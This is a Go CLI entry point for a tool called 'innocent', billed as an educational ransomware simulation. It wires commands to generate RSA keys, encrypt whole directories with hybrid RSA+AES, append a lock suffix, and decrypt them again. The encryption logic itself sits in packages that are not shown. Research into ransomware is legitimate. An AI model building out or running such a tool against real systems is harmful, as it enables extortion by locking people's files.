package main

import (
	"fmt"
	"os"

	"github.com/smile10/innocent/key"
	"github.com/smile10/innocent/rs"
	"github.com/spf13/cobra"
)

func main() {
	rootCmd := &cobra.Command{
		Use:   "innocent",
		Short: "Innocent – Educational ransomware simulation CLI tool",
		Long: `WARNING: This tool simulates ransomware behavior for educational and research purposes only.
Unauthorized use, distribution, or deployment of this software for malicious intent is strictly prohibited.
The author assumes no responsibility for misuse.`,
	}

	// generate-keys command
	genkeyCmd := &cobra.Command{
		Use:   "generate-keys",
		Short: "Generate an RSA key pair",
		Run: func(cmd *cobra.Command, args []string) {
			path, _ := cmd.Flags().GetString("path")
			keysize, _ := cmd.Flags().GetInt("keysize")

			err := key.CreateKeys(path, keysize)
			if err != nil {
				fmt.Println("Error generating keys:", err)
				return
			}
			fmt.Printf("Generated %d-bit RSA key pair at %s\n", keysize, path)
		},
	}

	genkeyCmd.Flags().Int("keysize", 4096, "RSA key size (e.g. 2048, 4096)")
	genkeyCmd.Flags().String("path", "./", "Directory to store the generated key files")

	decryptKeyCmd := &cobra.Command{
		Use:   "decrypt-key",
		Short: "Decrypt Encrypted Private Key",
		Run: func(cmd *cobra.Command, args []string) {
			privateKeyPath, _ := cmd.Flags().GetString("privatekey")
			encryptedKeyPath, _ := cmd.Flags().GetString("encryptedkey")

			err := key.DecryptPrivateKey(privateKeyPath, encryptedKeyPath)
			if err != nil {
				fmt.Println("Error decrypting private key:", err)
				return
			}
			fmt.Println("Private key decrypted successfully")
		},
	}

	decryptKeyCmd.Flags().String("privatekey", "", "Output path for the decrypted private key")
	decryptKeyCmd.Flags().String("encryptedkey", "", "Path to the encrypted private key file")

	// encrypt command
	encryptCmd := &cobra.Command{
		Use:   "encrypt",
		Short: "Encrypt files using hybrid RSA + AES (ransomware simulation)",
		Run: func(cmd *cobra.Command, args []string) {
			publicKeyPath, _ := cmd.Flags().GetString("publickey")
			path, _ := cmd.Flags().GetString("path")
			blacklist, _ := cmd.Flags().GetStringSlice("ext-blacklist")
			whitelist, _ := cmd.Flags().GetStringSlice("ext-whitelist")
			skipHidden, _ := cmd.Flags().GetBool("skip-hidden")
			encSuffix, _ := cmd.Flags().GetString("encsuffix")

			err := rs.Encrypt(publicKeyPath, path, encSuffix, blacklist, whitelist, skipHidden)
			if err != nil {
				fmt.Println("Encryption error:", err)
				return
			}
			fmt.Println("Encryption completed")
		},
	}

	encryptCmd.Flags().String("publickey", "", "Path to the RSA public key file")
	encryptCmd.Flags().String("path", "", "Target directory for encryption")
	encryptCmd.Flags().String("encsuffix", "", "Suffix to append to encrypted files (e.g. .locked)")
	encryptCmd.Flags().StringSlice("ext-blacklist", []string{}, "File extensions to exclude from encryption")
	encryptCmd.Flags().StringSlice("ext-whitelist", []string{}, "Only encrypt files with these extensions (takes priority over blacklist)")
	encryptCmd.Flags().Bool("skip-hidden", true, "Skip hidden files and directories")

	// decrypt command
	decryptCmd := &cobra.Command{
		Use:   "decrypt",
		Short: "Decrypt previously encrypted files",
		Run: func(cmd *cobra.Command, args []string) {
			privateKeyPath, _ := cmd.Flags().GetString("privatekey")
			path, _ := cmd.Flags().GetString("path")
			blacklist, _ := cmd.Flags().GetStringSlice("ext-blacklist")
			whitelist, _ := cmd.Flags().GetStringSlice("ext-whitelist")
			skipHidden, _ := cmd.Flags().GetBool("skip-hidden")
			encSuffix, _ := cmd.Flags().GetString("encsuffix")

			err := rs.Decrypt(privateKeyPath, path, encSuffix, blacklist, whitelist, skipHidden)
			if err != nil {
				fmt.Println("Decryption error:", err)
				return
			}
			fmt.Println("Decryption completed")
		},
	}

	decryptCmd.Flags().String("privatekey", "", "Path to the RSA private key file")
	decryptCmd.Flags().String("path", "", "Target directory for decryption")
	decryptCmd.Flags().String("encsuffix", "", "Suffix of encrypted files to process (e.g. .locked)")
	decryptCmd.Flags().StringSlice("ext-blacklist", []string{}, "File extensions to exclude from decryption")
	decryptCmd.Flags().StringSlice("ext-whitelist", []string{}, "Only decrypt files with these extensions (takes priority over blacklist)")
	decryptCmd.Flags().Bool("skip-hidden", true, "Skip hidden files and directories")

	rootCmd.AddCommand(genkeyCmd)
	rootCmd.AddCommand(decryptKeyCmd)
	rootCmd.AddCommand(encryptCmd)
	rootCmd.AddCommand(decryptCmd)

	if err := rootCmd.Execute(); err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
}
